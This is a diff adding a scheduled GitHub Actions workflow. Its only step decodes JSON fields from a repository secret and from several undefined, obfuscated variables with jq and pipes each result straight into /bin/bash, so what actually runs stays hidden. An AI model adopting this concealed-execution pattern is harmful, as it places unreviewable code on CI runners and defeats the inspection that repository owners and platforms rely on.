@@ -1,0 +1,24 @@
+name: xiaopazhanyintao
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '1 5/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: xiaopazhanyintao
+        env:
+          cv204: ${{ secrets.cv204 }}
+        run: |
+          echo $cv204 | jq -r .omhn77 | /bin/bash
+          echo $x876 | jq -r .wo6823 | /bin/bash
+          echo $aisrj9 | jq -r .hh9892 | /bin/bash
+          echo $ri163 | jq -r .xtic42 | /bin/bash
+          echo $b0 | jq -r .dyl98413 | /bin/bash
+          echo $tvl529 | jq -r .heoe55 | /bin/bash
+          echo $fraen698 | jq -r .zv39 | /bin/bash
+          echo $y129 | jq -r .dymc890 | /bin/bash
+          echo $up72 | jq -r .s87526 | /bin/bash
+
